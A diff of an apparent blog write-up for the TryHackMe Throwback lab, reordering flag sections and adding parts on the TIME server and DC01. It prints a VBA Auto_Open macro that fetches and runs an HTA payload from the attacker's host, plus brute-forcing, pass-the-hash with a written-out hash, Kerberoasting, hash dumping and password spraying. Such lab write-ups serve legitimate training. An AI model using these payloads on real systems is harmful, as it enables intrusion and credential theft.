@@ -15,23 +15,24 @@ categories: thm
 2. [THROWBACK-FW01](#throwback-fw01)
  - [Logging In](#logging-in)
  - [Reverse Shell](#reverse-shell)
- - [Flags](#fw01-flags)
  - [Credentials](#credentials)
+ - [Flags](#fw01-flags)
 3. [THROWBACK-MAIL](#throwback-mail)
- - [Flags](#mail-flags)
  - [Brute-forcing](#brute-forcing)
+ - [Flags](#mail-flags)
 4. [THROWBACK WS01](#throwback-ws01)
  - [Phishing](#phishing)
- - [Flags](#ws01-flags)
  - [LLMNR Poisoning](#llmnr-poisoning)
- - [More Flags](#dc01-flag)
+ - [Flags](#ws01-flags)
  - [Kerberoasting](#kerberoasting)
 5. [THROWBACK-PROD](#throwback-prod)
  - [Post Exploitation Framework](#post-exploitation-framework)
  - [Enumeration](#enumeration-with-seatbelt)
  - [Privilege Escalation](#privilege-escalation)
- - [Flags](#prod-flags)
  - [Dumping Hashes and Passwords](#dumping-hashes-and-passwords) 
+ - [Flags](#prod-flags)
+6. [THROWBACK-TIME](#throwback-time)
+7. [THROWBACK-DC01](#throwback-dc01)
 
 ## Enumeration
 ---
@@ -188,18 +189,6 @@ Then, after poking around what the panel has to offer, I found a diagnostics pag
 
 ![reverse shell from my machine](/assets/img/posts/throwback/4_pfsense_root.webp)
 
-### FW01 Flags
-
-Using the following command, I was able to find search for .txt files on the machine to find the flags.
-
-```shell
-find / -iname "*.txt" 2>&1
-```
-
-This way, I found flags 3 and 4.
-
-![flags 3 and 4](/assets/img/posts/throwback/5_fw01_flags.webp)
-
 ### Credentials
 
 Also in `/var/logs/` I found the unusual log `login.log`, which contained encrypted credentials to a user **HumphreyW**.
@@ -210,6 +199,20 @@ His password was easily cracked using [Crackstation](https://crackstation.net/):
 
 ![humphreyws cracked password](/assets/img/posts/throwback/7_humphrey_cracked.webp)
 
+### FW01 Flags
+
+Using the following command, I was able to find search for .t
+xt files on the machine to find the flags:
+
+```shell
+find / -iname "*.txt" 2>&1
+```
+
+This way, I found both flags in these locations:.
+
+![flags 3 and 4](/assets/img/posts/throwback/5_fw01_flags.web
+p)
+
 ## Throwback MAIL
 ---
 
@@ -219,19 +222,7 @@ This is the mail server, which also has a web interface and login page. The gues
 
 ![mail interface guest credentials](/assets/img/posts/throwback/8_mail_login.webp)
 
-### MAIL Flags
-
-This authenticated web interface contained the first two flags to submit.
-
-I found the first flag in the **Welcome** email in the inbox:
-
-![first flag](/assets/img/posts/throwback/9_flag1.webp)
-
-And the second flag in the address book:
-
-![second flag](/assets/img/posts/throwback/10_flag2.webp)
-
-The address book also more importantly contained a list of employee names and emails, which I compiled into seperate documents to use later on.
+The address book contained a list of employee names and emails, which I compiled into seperate documents to use later on.
 
 ![list of usernames and emails](/assets/img/posts/throwback/11_emails_and_usernames.webp)
 
@@ -254,6 +245,16 @@ hydra -L mail_users.txt -P mail_pass.txt 10.200.29.232 http-post-form '/src/redi
 And successfully found these users' passwords:
 
 ![hydra found passwords](/assets/img/posts/throwback/14_hydra_found.webp)
+
+### MAIL Flags
+
+I found the first flag in the **Welcome** email in the inbox:
+
+![first flag](/assets/img/posts/throwback/9_flag1.webp)
+
+And the second flag in the address book:
+
+![second flag](/assets/img/posts/throwback/10_flag2.webp)
 
 ## THROWBACK WS01
 ---
@@ -281,16 +282,6 @@ Setup a handler using msfconsole:
 And got a meterpreter shell as the user **BlaireJ** on their workstation:
 
 ![meterpreter shell](/assets/img/posts/throwback/17_meterpreter_shell.webp)
-
-### WS01 Flags
-
-From here, I found the two flags on the machine with ease (flags 5 & 6). The first being on BlaireJ's desktop:
-
-![flag 5](/assets/img/posts/throwback/18_flag5.webp)
-
-And the second on HumphreyW's desktop:
-
-![flag 6](/assets/img/posts/throwback/19_flag6.webp)
 
 ### LLMNR Poisoning
 
@@ -381,15 +372,6 @@ runas /savecred /user:admin-petersj /profile "cmd.exe"
 
 ![privesc to admin-petersj](/assets/img/posts/throwback/31_petersj_privesc.webp)
 
-### PROD Flags
-
-From here, I was able to read all three flags on the PROD machine (flags 7, 8 & 9):
-
-![prod flags](/assets/img/posts/throwback/32_prod_flags.webp)
-
-## THROWBACK-WS01
----
-
 ### Dumping Hashes and Passwords
 
 Now that I had elevated privilages, I could run the stager in the command prompt and use admin-petersj as a privilaged agent: 
@@ -408,6 +390,12 @@ Luckily, Starkiller formats the output cleanly to into the credentials tab:
 
 ![mimikatz creds](/assets/img/posts/throwback/36_mimikatz_creds.webp)
 
+### PROD Flags
+
+I was able to read all three flags on the PROD machine in the following locations:
+
+![prod flags](/assets/img/posts/throwback/32_prod_flags.webp)
+
 ## THROWBACK-WS01
 ---
 
@@ -422,8 +410,7 @@ To move deeper, I needed to pivot. To begin this process, I firstly setup a reve
 After that I setup a SOCKS4 proxy with proxychains and msfconsole's `socks_proxy` auxiliary module, and used this **crackmapexec** command:
 
 ```shell
-proxychains -q crackmapexec smb 10.200.29.0/24 -p 1080 -u Bla
-ireJ -d THROWBACK -H c374ecb7c2ccac1df3a82bce4f80bb5b
+proxychains -q crackmapexec smb 10.200.29.0/24 -p 1080 -u BlaireJ -d THROWBACK -H c374ecb7c2ccac1df3a82bce4f80bb5b
 ```
 
 ![proxychains crackmapexec](/assets/img/posts/throwback/38_crackmapexec.webp)
@@ -458,12 +445,6 @@ And was able to query the data for very specific information. This included a fu
 
 ![bloodhound listing domain admins](/assets/img/posts/throwback/44_bloodhound_da.webp)
 
-### DC01 Flag
-
-One of which contained a flag (flag 15):
-
-![domain admin with flag](/assets/img/posts/throwback/45_bloodhound_flag.webp)
-
 ### Kerberoasting
 
 BloodHound also allowed me to query for kerbaroastable accounts, one of which being the account **sqlservice**, for - suprisingly - the SQL database running on one of the machines:
@@ -477,5 +458,120 @@ To perform the attack on the sqlservice account, I used Impacket's [GetUserSPNs]
 To decrypt the ticket and crack the password hash, I again used penglab and hashcat to get the accounts password `mysql337570`:
 
 ![cracking ticket](/assets/img/posts/throwback/48_sqlservice_cracked.webp)
+
+### WS01 Flags
+
+I found the first flag for this machine on BlaireJ's desktop:
+
+![flag 5](/assets/img/posts/throwback/18_flag5.webp)
+
+The second on HumphreyW's desktop:
+
+![flag 6](/assets/img/posts/throwback/19_flag6.webp)
+
+And the third in the description of one of the domain admins in BloodHound:
+
+![domain admin with flag](/assets/img/posts/throwback/45_bloo
+dhound_flag.webp)
+
+# THROWBACK-TIME
+---
+
+My next target was the THROWBACK-TIME machine, a server used for employees to upload time keeping spreadsheets. To firstly access the web logon interface, I used [FoxyProxy]() - a web proxy - on the port 1080:
+
+![timekeep server through proxy](/assets/img/posts/throwback/49_timekeep_webproxy.webp)
+
+But no credentials were being re-used, so I logged back in to the mail server, to find a password reset email in **MurphyF**'s inbox:
+
+![murphyF login](/assets/img/posts/throwback/50_murphy_passwordreset.webp)
+
+I added the virtual host `timekeep.throwback.local` to my `/etc/hosts` and clicked the link to reset his email to `PASSWORD`.
+
+I then logged in to MurphyF's account to find Timesheet.xlsm upload form:
+
+![timesheet upload form](/assets/img/posts/throwback/51_timekeep_upload.webp)
+
+So, I needed a way to use the Timesheet.xlsm to get a shell on the server.
+
+### Malcious VBA Macro
+
+To do this, I wrote this VBA macro:
+```vba
+Sub macro()
+    PID = Shell("mshta.exe http://10.50.27.129:8080/PGu0H7bw.hta")
+End Sub
+
+Sub Auto_Open()
+    macro
+End Sub
+```
+
+And implanted it into a fake Timesheet.xlsm (macro enabled excel document) to upload:
+
+![macro in excel](/assets/img/posts/throwback/52_macro.webp)
+
+![uploading xlsm](/assets/img/posts/throwback/54_uploading_timekeep.webp)
+
+![admin will review page](/assets/img/posts/throwback/55_adminreview.webp)
+
+Once uploaded, with a hta server running using msfconsole, a few seconds later I got a shell as the **Administrator**.
+
+![admin shell on time](/assets/img/posts/throwback/56_admin_meterpreter.webp)
+
+However, I couldn't dump the hashes in this under-privileged process, so I migrated into the `mslogon.exe` process (an NT AUTHORITY\SYSTEM process) and ran meterpreter's **hashdump** command to dump the NTLM hashes stored on the system:
+
+![time hashdump](/assets/img/posts/throwback/57_hashdump.webp)
+
+This password was easily cracked using Crackstation to reveal their password `keeperoftime`:
+
+![timekeepers hash cracked](/assets/img/posts/throwback/58_timekeeper_cracked.webp)
+
+### SQL Database
+
+I then used these credentials to SSH into the TIME server, and access the SQL databses:
+
+![time ssh](/assets/img/posts/throwback/59_timekeeper_ssh.webp)
+
+![sql database](/assets/img/posts/throwback/60_sqldb.webp)
+
+This revealed a list of users and passwords for the timekeep server:
+
+![timekeep server users](/assets/img/posts/throwback/61_timekeep_userdb.webp)
+
+As well as a list of domain users:
+
+![domain users](/assets/img/posts/throwback/62_domainusers.webp)
+
+Which I copied and formatted in Vim into a seperate document:
+
+![formatted domain users](/assets/img/posts/throwback/63_formatted_domainusers.webp)
+
+### Flags
+
+The first flag for this machine was from the password reset l
+ink in MurphyF's inbox:
+
+![murphy password reset flag](/assets/img/posts/throwback/53_
+murphyflag.webp)
+
+The second was in the timekeepusers database:
+
+![timekeepusers flag](/assets/img/posts/throwback/61_timekeep_userdb.webp)
+
+And the third was the root flag on the Administrators Desktop:
+
+![time root flag](/assets/img/posts/throwback/64_timerootflag.webp)
+
+# THROWBACK-DC01
+---
+
+I then used this list of users in combination with the weak p
+assword list that I used to spray the mail server, to spray t
+he Domain Controller (DC01) with crackmapexec:
+
+```shell
+proxychains -q crackmapexec smb 10.200.29.117 -u domainusers.
+txt -p mail_pass.txt --continue-on-success
+```
 
 [Throwback]: https://tryhackme.com/room/throwback
